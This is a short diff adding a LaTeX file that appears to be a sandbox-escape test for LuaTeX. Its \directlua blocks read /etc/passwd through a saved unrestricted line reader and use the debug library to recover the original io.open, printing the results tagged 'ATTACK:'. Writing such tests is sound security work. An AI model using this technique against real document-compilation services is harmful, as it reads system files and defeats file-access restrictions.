@@ -1,0 +1,11 @@
+% Uses the unrestricted io.lines that luatex-core keeps, then the debug library.
+\documentclass{article}
+\begin{document}
+\directlua{
+  for line in io.saved_lines('/etc/passwd') do texio.write_nl('ATTACK: ' .. line) end
+}
+\directlua{
+  local name, original = debug.getupvalue(io.open, 1)
+  texio.write_nl('ATTACK: ' .. tostring(original))
+}
+\end{document}
